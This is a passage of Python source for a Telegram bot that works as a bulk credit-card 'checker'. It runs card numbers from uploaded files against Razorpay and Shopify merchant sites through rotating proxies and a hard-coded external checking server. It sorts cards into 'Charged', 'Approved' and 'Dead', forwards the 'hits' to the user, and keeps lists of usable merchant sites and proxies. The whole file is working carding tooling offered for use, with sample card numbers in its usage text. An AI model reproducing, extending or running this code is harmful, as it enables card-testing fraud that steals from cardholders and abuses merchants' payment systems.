        sites_text = "\n".join([f"{i+1}. <code>{s[:60]}</code>" for i, s in enumerate(user_sites)])
        await event.reply(premium_emoji(f"""📋 Your Sites: <code>{len(user_sites)}</code>

{sites_text}
━━━━━━━━━━━━━━━━━━━━
🗑 /rm url | 💣 /clearsites
📋 /site - Check all"""), parse_mode="html")
    else:
        filename = f"mysites_{user_id}_{int(time.time())}.txt"
        with open(filename, "w") as f:
            for s in user_sites:
                f.write(f"{s}\n")
        await event.reply(premium_emoji(f"📋 {len(user_sites)} Sites"), file=filename)
        os.remove(filename)

# ==================== /clearsites ====================
@bot.on(events.NewMessage(pattern=r'^/clearsites$'))
async def clear_user_sites_cmd(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)

    if not user_sites:
        await event.reply(premium_emoji("❌ No sites to clear!"), parse_mode="html")
        return

    count = len(user_sites)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = f"sites_backup_{user_id}_{timestamp}.txt"
    with open(backup_file, "w") as f:
        for s in user_sites:
            f.write(f"{s}\n")

    await clear_user_sites(user_id)
    await event.reply(premium_emoji(f"✅ Cleared {count} sites! Backup attached."), file=backup_file)
    try:
        os.remove(backup_file)
    except:
        pass

# ==================== /addrzsites ====================
@bot.on(events.NewMessage(pattern=r'^/addrzsites\s+(.+)'))
async def add_razorpay_site(event):
    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"

    status_msg = await event.reply(premium_emoji(f"🔄 Testing Razorpay Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")

    proxies = load_proxies()
    if not proxies:
        await status_msg.edit(premium_emoji("❌ No proxies available!"))
        return

    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"

    try:
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(base_url, ssl=False) as resp:
                raw_text = await resp.text()
                if not raw_text or len(raw_text) < 10:
                    await status_msg.edit(premium_emoji("❌ RZ Site Dead! Empty Response."), parse_mode="html")
                    return
                try:
                    raw = json.loads(raw_text)
                except:
                    await status_msg.edit(premium_emoji("❌ RZ Site Dead! Invalid Response."), parse_mode="html")
                    return

                response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'connection', 'refused']

                if any(x in response_msg for x in dead_indicators):
                    await status_msg.edit(premium_emoji(f"❌ RZ Site Dead!\n\n<code>{site[:60]}</code>"), parse_mode="html")
                    return

                current_rz = get_file_lines(RZ_SITES_FILE)
                if site not in current_rz:
                    async with aiofiles.open(RZ_SITES_FILE, 'a') as f:
                        await f.write(f"{site}\n")
                    await status_msg.edit(premium_emoji(f"""✅ Razorpay Site Added!

📊 Total RZ Sites: <code>{len(current_rz) + 1}</code>

💡 /rzsites - Check | /rmrzsites url - Remove"""), parse_mode="html")
                else:
                    await status_msg.edit(premium_emoji("⚠️ Already in RZ list!"), parse_mode="html")
    except:
        await status_msg.edit(premium_emoji("❌ Test Failed! Not Added."), parse_mode="html")

# ==================== /rmrzsites ====================
@bot.on(events.NewMessage(pattern=r'^/rmrzsites\s+(.+)'))
async def remove_razorpay_site(event):
    site_to_remove = event.pattern_match.group(1).strip()
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"

    current_rz = get_file_lines(RZ_SITES_FILE)
    if not current_rz:
        await event.reply(premium_emoji("❌ No Razorpay sites found!\nUse /addrzsites url to add."), parse_mode="html")
        return

    found = None
    for s in current_rz:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break

    target = found if found else site_to_remove
    if target not in current_rz:
        await event.reply(premium_emoji("❌ Site not found in RZ list!\n\nUse /rzsites to view all."), parse_mode="html")
        return

    new_rz = [s for s in current_rz if s != target]
    async with aiofiles.open(RZ_SITES_FILE, 'w') as f:
        for s in new_rz:
            await f.write(f"{s}\n")

    await event.reply(premium_emoji(f"""✅ Razorpay Site Removed!

🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{len(new_rz)}</code>

💡 /addrzsites url | /rzsites"""), parse_mode="html")

# ==================== /rzsites ====================
@bot.on(events.NewMessage(pattern=r'^/rzsites$'))
async def rz_sites_check(event):
    user_id = event.sender_id
    sites = get_file_lines(RZ_SITES_FILE)
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No Razorpay sites in rz_sites.txt\nUse /addrzsites url to add."))
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies."))
        return

    msg = await event.reply(premium_emoji(f"""<b>⚡ RZ Site Checker</b>

📊 Total Sites: <code>{len(sites)}</code>
🔍 Testing with Razorpay API...
"""), parse_mode="html")

    alive = []
    dead = []
    checked = 0
    test_card = "5154623245618097|03|2032|156"

    for site in sites:
        checked += 1
        proxy = random.choice(proxies)
        try:
            base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}&proxy={proxy}"
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(base_url, ssl=False) as resp:
                    raw_text = await resp.text()
                    if not raw_text or len(raw_text) < 10:
                        dead.append(site)
                        continue
                    try:
                        raw = json.loads(raw_text)
                    except:
                        dead.append(site)
                        continue

                    response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                    dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'site not supported', 'connection', 'refused']

                    if any(x in response_msg for x in dead_indicators):
                        dead.append(site)
                    else:
                        alive.append(site)
        except:
            dead.append(site)

        if checked % 5 == 0 or checked == len(sites):
            try:
                await msg.edit(premium_emoji(f"""<b>⚡ RZ Site Checker</b>

📊 Total: <code>{len(sites)}</code>
✅ Working: <code>{len(alive)}</code>
❌ Dead: <code>{len(dead)}</code>
🔄 Checked: <code>{checked}/{len(sites)}</code>"""), parse_mode="html")
            except:
                pass

    if alive:
        txt_file = "working_rz_sites.txt"
        with open(txt_file, "w") as f:
            for s in alive:
                if not s.startswith("http"):
                    s = "https://" + s
                f.write(s + "\n")
        await bot.send_message(user_id, f"📄 **{len(alive)} Working RZ Sites**", file=txt_file)
        os.remove(txt_file)

    await msg.edit(premium_emoji(f"""<b>✅ RZ Site Check Complete</b>

📊 Total: <code>{len(sites)}</code>
✅ Working: <code>{len(alive)}</code>
❌ Dead: <code>{len(dead)}</code>
📄 TXT File Sent ✅"""), parse_mode="html")

# ==================== /proxy ====================
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty."))
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(proxies)} Proxies..."))

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(premium_emoji(f"""🔄 Checking Proxies...

✅ Working: <code>{len(alive_proxies)}</code>
❌ Dead: <code>{len(dead_proxies)}</code>
📊 Progress: <code>{min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}</code>"""), parse_mode="html")

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        if alive_proxies:
            txt_file = "working_proxies.txt"
            with open(txt_file, "w") as f:
                f.write("\n".join(alive_proxies))
            await bot.send_message(user_id, f"📄 **{len(alive_proxies)} Working Proxies**", file=txt_file)
            os.remove(txt_file)

        await status_msg.edit(premium_emoji(f"""✅ Proxy Check Complete!

✅ Working: <code>{len(alive_proxies)}</code>
❌ Removed: <code>{len(dead_proxies)}</code>
📄 TXT File Sent ✅"""), parse_mode="html")
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"))

# ==================== /getproxy ====================
@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in `proxy.txt`"))
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 **All Proxies ({len(current_proxies)}):**\n\n{proxy_list}"), parse_mode="html")
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"📋 **All Proxies ({len(current_proxies)}):**\n\nFile attached below."), file=filename)
        try:
            os.remove(filename)
        except:
            pass

# ==================== /rmproxy ====================
@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: `/rmproxy ip:port:user:pass`"))
        return

    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: `{proxy_to_remove}`"))
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ **Proxy Removed!**\n\n`{proxy_to_remove}`\n📊 Remaining: `{len(new_proxies)}`"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("""❌ Usage: /addproxy followed by proxies

Valid Formats:
• ip:port
• ip:port:username:password
• socks5://ip:port
• socks4://ip:port:username:password
• http://username:password@ip:port
• host:port:username:password"""), parse_mode="html")
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."))
            return

        current_proxies = load_proxies()
        added = 0
        dead = 0

        status_msg = await event.reply(premium_emoji(f"🔄 Testing {len(proxies_to_add)} Proxies...\n✅ Added: 0 | ❌ Dead: 0"))

        for proxy in proxies_to_add:
            result = await test_proxy(proxy)
            if result['status'] == 'alive':
                if proxy not in current_proxies:
                    async with aiofiles.open(PROXY_FILE, 'a') as f:
                        await f.write(f"{proxy}\n")
                    current_proxies.append(proxy)
                    added += 1
            else:
                dead += 1

            await status_msg.edit(premium_emoji(f"🔄 Testing Proxies...\n\n✅ Added: {added}\n❌ Dead: {dead}\n📊 Total: {len(current_proxies)}"), parse_mode="html")

        await status_msg.edit(premium_emoji(f"✅ Proxy Add Complete!\n\n✅ Added: {added}\n❌ Dead: {dead}\n📊 Total Proxies: {len(current_proxies)}"), parse_mode="html")
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"))

@bot.on(events.NewMessage(pattern=r'^/rz\s*'))
async def single_razorpay_cc(event):
    user_id = event.sender_id
    save_user(user_id)

    if len(event.message.text.strip()) <= 5:
        await event.reply("Usage: `/rz 4097580790933573|06|2030|208`")
        return

    sites = load_razorpay_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Razorpay sites ya proxies missing."))
        return

    text = event.message.text or ""
    parts = text.split(' ', 1)
    if len(parts) < 2:
        await event.reply("❌ Data missing")
        return

    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: card|mm|yyyy|cvv"))
        return

    try:
        sender = await event.get_sender()
        first_name = sender.first_name if sender.first_name else "User"
    except:
        first_name = "User"

    card = cards[0]
    status_msg = await event.reply(premium_emoji("<b>⚡ Razorpay Checking...</b>"), parse_mode='html')

    try:
        result = await check_card_razorpay(card, random.choice(proxies))

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        price = result.get("price", "1")
        response_msg = str(result.get('message', 'Unknown'))[:150]

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        else:
            status_emoji = "❌"
            status_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 😂"

        current_time = datetime.now().strftime("%H:%M:%S IST")

        final_resp = f"""<b>⚡💳 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐇𝐈𝐓 💳⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>✔️ 𝐂𝐂 ➜ </b><tg-spoiler><code>{result['card']}</code></tg-spoiler>
<b>⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_emoji} {status_text}</b>
<b>⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}</b>
━━━━━━━━━━━━━━━━━━━━
<b>💰 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ ₹{price}</b>
<b>💳 𝐁𝐢𝐧 ➜ {card[:6]} - {brand}</b>
<b>🏧 𝐁𝐚𝐧𝐤 ➜ {bank}</b>
<b>☄️ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} {flag}</b>
<b>⏳ 𝐓𝐢𝐦𝐞 ➜ {current_time}</b>
<b>👑 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="tg://user?id={user_id}">{first_name}</a></b>"""

        cc_copy = result['card']
        buttons = [[Button.url("📋 COPY CC", f"tg://copy?text={cc_copy}")]]

        try:
            await status_msg.delete()
        except:
            pass

        await send_to_chat(event.chat_id, premium_emoji(final_resp), buttons=buttons, parse_mode="html")

        if result['status'] in ['Charged', 'Approved']:
            await send_realtime_hit_dm(user_id, result, result['status'], first_name)
    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
        except:
            await event.reply(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rzchk(?:@\w+)?(?:\s|$)'))
async def razorpay_bulk_check(event):
    user_id = event.sender_id
    save_user(user_id)

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("Reply to .txt file."))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("Sirf .txt file reply kar."))
        return

    sites = load_razorpay_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Razorpay sites/Proxies missing."))
        return

    status_msg = await event.reply(premium_emoji("🫆 Processing Razorpay file..."))

    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try:
        os.remove(file_path)
    except:
        pass

    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("No valid cards found."))
        return

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"Starting Razorpay check for {total_cards} cards..."))

    session_key = f"rz_{user_id}_{status_msg.id}"
    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time()}

    active_sessions[session_key] = {'paused': False, 'results': all_results}

    queue = asyncio.Queue()
    for card in cards:
        await queue.put(card)

    async def worker():
        while not queue.empty() and session_key in active_sessions:
            if active_sessions[session_key].get('paused'):
                await asyncio.sleep(0.5)
                continue
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            res = await check_card_razorpay(card, random.choice(proxies))
            all_results['checked'] += 1

            if res['status'] == 'Charged':
                all_results['charged'].append(res)
                await send_realtime_hit_dm(user_id, res, 'Charged', username)
            elif res['status'] == 'Approved':
                all_results['approved'].append(res)
                await send_realtime_hit_dm(user_id, res, 'Approved', username)
            else:
                all_results['dead'].append(res)

            queue.task_done()

            if all_results['checked'] % 10 == 0 or all_results['checked'] == total_cards:
                await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username, is_razorpay=True)

    workers = [asyncio.create_task(worker()) for _ in range(5)]

    try:
        while workers:
            done, pending = await asyncio.wait(workers, timeout=1.3)
            workers = list(pending)
            if session_key not in active_sessions:
                break
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(event.chat_id, all_results)

async def send_final_results(chat_id, results):
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'dead': [], 'error_cards': [], 'errors': 0, 'total': 0, 'start_time': time.time()}

    if 'start_time' not in results:
        results['start_time'] = time.time()

    error_count = len(results.get('error_cards', []))

    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('dead', [])) + error_count

    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results.get('charged'):
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results.get('approved'):
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
    price = "0.00"

    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["approved"][0].get("price", "-")

    summary = f"""<b>⚡💳 ㅤ𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results.get('total', 0)} | ✅ Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count}</blockquote>
<blockquote>🌐 𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ 🔥 {gateway} | 💰 {price}</blockquote> 
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"Checker_Result_{chat_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
        await f.write("-" * 70 + "\n")
        for r in results.get('charged', []):
            await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results.get('approved', []))}):\n")
        await f.write("-" * 70 + "\n")
        for r in results.get('approved', []):
            await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results.get('dead', []))}):\n")
        await f.write("-" * 70 + "\n")
        for r in results.get('dead', []):
            await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")

        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write(f"\n⚠️ ERRORS ({len(error_cards)}):\n")
            await f.write("-" * 70 + "\n")
            for r in error_cards:
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")

    error_file = None
    if error_cards:
        error_file = f"Error_Cards_{chat_id}_{timestamp}.txt"
        async with aiofiles.open(error_file, 'w') as f:
            await f.write("=" * 50 + "\n")
            await f.write("⚠️ ERROR/FAILED CARDS\n")
            await f.write(f"Total: {len(error_cards)}\n")
            await f.write("=" * 50 + "\n\n")
            await f.write("CC | Error Message | Gateway\n")
            await f.write("-" * 50 + "\n")
            for r in error_cards:
                await f.write(f"{r.get('card', '')} | {str(r.get('message', ''))[:80]} | {r.get('gateway', '')}\n")

    try:
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
        if error_file:
            await bot.send_message(chat_id, f"⚠️ <b>{len(error_cards)} Error/Failed Cards</b>", file=error_file, parse_mode="html")
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
        if error_file:
            await bot.send_message(chat_id, f"⚠️ {len(error_cards)} Error Cards", file=error_file)
    except Exception as e:
        print(f"Send final error: {e}")
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")

    try:
        os.remove(filename)
    except:
        pass
    if error_file:
        try:
            os.remove(error_file)
        except:
            pass

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
        url = f"http://45.61.54.123:7002/shopify?site={site}&cc={test_card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        response_msg = str(raw.get("Response", "")).lower()
        if is_dead_site_error(response_msg):
            return {"site": site, "status": "dead"}
        return {"site": site, "status": "alive"}
    except Exception:
        return {"site": site, "status": "dead"}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    save_user(user_id)

    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    welcome_msg = f"""<b>⚡ UNLIMITED CHECKER & GENERATOR ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 User: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>✅ User ID: <code>{user_id}</code></b>
<b>♾️ Access: Unlimited (No Subscription Required)</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option below:</b>"""

    main_buttons = [
        [
            Button.inline("  𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🔍  ", b"checker"),
            Button.inline("  𝙏𝙊𝙊𝙇𝙎 🛠️  ", b"tools_menu"),
        ],
    ]

    await bot.send_file(
        event.chat_id,
        file=PHOTO_URL,
        caption=premium_emoji(welcome_msg),
        buttons=main_buttons,
        parse_mode="html",
        force_document=False
    )

# ==================== CHECKER MENU ====================
@bot.on(events.CallbackQuery(data=b"checker"))
async def checker_menu(event):
    checker_buttons = [
        [
            Button.inline("𝘼𝙐𝙏𝙃", b"auth"),
            Button.inline("𝘾𝙃𝘼𝙍𝙂𝙀", b"charge"),
        ],
        [
            Button.inline("𝙈𝘼𝙎𝙎", b"mass"),
        ],
        [
            Button.inline("🔙 𝘽𝘼𝘾𝙆", b"back_to_start"),
        ]
    ]

    await event.edit(
        premium_emoji("<b>🔒 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 𝙈𝙀𝙉𝙐 🔒</b>\n\n<b>👇 Select Check Mode:</b>"),
        buttons=checker_buttons,
        parse_mode="html"
    )

@bot.on(events.CallbackQuery(data=b"auth"))
async def auth_handler(event):
    await event.answer("⚡ Auth Mode Activated!", alert=True)
    auth_msg = """<b>⚡💳 AUTH MODE ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 Gateway: Razorpay</b>
<b>💰 Amount: ₹1</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Use command:</b>
<code>/rz 4097580790933573|06|2030|208</code>
━━━━━━━━━━━━━━━━━━━━
<b>💠 Gateway: Shopify</b>
<b>💰 Amount: Auto USD</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Use command:</b>
<code>/cc 4097580790933573|06|2030|208</code>"""

    await event.edit(premium_emoji(auth_msg), buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"checker")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"charge"))
async def charge_handler(event):
    await event.answer("⚡ Charge Mode Activated!", alert=True)
    charge_msg = """<b>⚡💳 CHARGE MODE ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 Gateway: Razorpay</b>
<b>💰 Amount: ₹1</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Use command:</b>
<code>/rz 4097580790933573|06|2030|208</code>
━━━━━━━━━━━━━━━━━━━━
<b>💠 Gateway: Shopify</b>
<b>💰 Amount: Auto USD</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Use command:</b>
<code>/cc 4097580790933573|06|2030|208</code>"""

    await event.edit(premium_emoji(charge_msg), buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"checker")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"mass"))
async def mass_handler(event):
    await event.answer("📋 Mass Check Info!", alert=True)
    mass_msg = """<b>⚡ MASS CHECK MODE ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔥 Shopify Bulk:</b>
<code>/chk</code> <b>(Reply to .txt file)</b>

<b>💎 Razorpay Bulk:</b>
<code>/rzchk</code> <b>(Reply to .txt file)</b>
━━━━━━━━━━━━━━━━━━━━
<b>♾️ Access: Unlimited</b>"""

    await event.edit(premium_emoji(mass_msg), buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"checker")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"back_to_start"))
async def back_to_start(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    welcome_msg = f"""<b>⚡ UNLIMITED CHECKER & GENERATOR ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 User: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>✅ User ID: <code>{user_id}</code></b>
<b>♾️ Access: Unlimited (No Subscription Required)</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option below:</b>"""

    main_buttons = [
        [
            Button.inline("  𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🔍  ", b"checker"),
            Button.inline("  𝙏𝙊𝙊𝙇𝙎 🛠️  ", b"tools_menu"),
        ],
    ]

    await event.edit(
        premium_emoji(welcome_msg),
        buttons=main_buttons,
        parse_mode="html"
    )

# ==================== TOOLS MENU ====================
@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu(event):
    await event.answer("🔧 Tools Opened!", alert=False)
    tools_msg = """<b>🛠️ UNLIMITED TOOLS MENU 🛠️</b>
━━━━━━━━━━━━━━━━━━━━
<b>Select a tool category below:</b>"""

    tools_buttons = [
        [
            Button.inline("𝙎𝙃𝙊𝙋𝙄𝙁𝙔", b"shopify_tools"),
            Button.inline("𝙍𝘼𝙕𝙊𝙍𝙋𝘼𝙔", b"rz_tools"),
        ],
        [
            Button.inline("𝙋𝙍𝙊𝙓𝙔", b"proxy_tools"),
            Button.inline("𝘾𝘾 𝙂𝙀𝙉 & 𝙏𝙊𝙊𝙇𝙎", b"cc_tools"),
        ],
        [
            Button.inline("🔙 𝘽𝘼𝘾𝙆", b"back_to_start"),
        ],
    ]

    await event.edit(
        premium_emoji(tools_msg),
        buttons=tools_buttons,
        parse_mode="html"
    )

@bot.on(events.CallbackQuery(data=b"shopify_tools"))
async def shopify_tools_menu(event):
    await event.answer("🛒 Shopify Tools!", alert=False)
    shopify_msg = """<b>🛒 Shopify Sites</b>
━━━━━━━━━━━━━━━━━━━━
<code>/site</code>
➜ Check all Shopify sites
➜ Remove dead sites automatically
➜ Get TXT file of working sites

<code>/addsites url</code>
➜ Test & add new Shopify site
➜ Only working sites added

<code>/rmsites url</code>
➜ Remove specific Shopify site"""

    await event.edit(
        premium_emoji(shopify_msg),
        buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"tools_menu")]],
        parse_mode="html"
    )

@bot.on(events.CallbackQuery(data=b"rz_tools"))
async def rz_tools_menu(event):
    await event.answer("💎 Razorpay Tools!", alert=False)
    rz_msg = """<b>💎 Razorpay Sites</b>
━━━━━━━━━━━━━━━━━━━━
<code>/rzsites</code>
➜ Check all RZ sites with Razorpay API
➜ Remove dead sites automatically
➜ Get TXT file of working RZ sites

<code>/addrzsites url</code>
➜ Test & add new Razorpay site
➜ Only working sites added

<code>/rmrzsites url</code>
➜ Remove specific Razorpay site"""

    await event.edit(
        premium_emoji(rz_msg),
        buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"tools_menu")]],
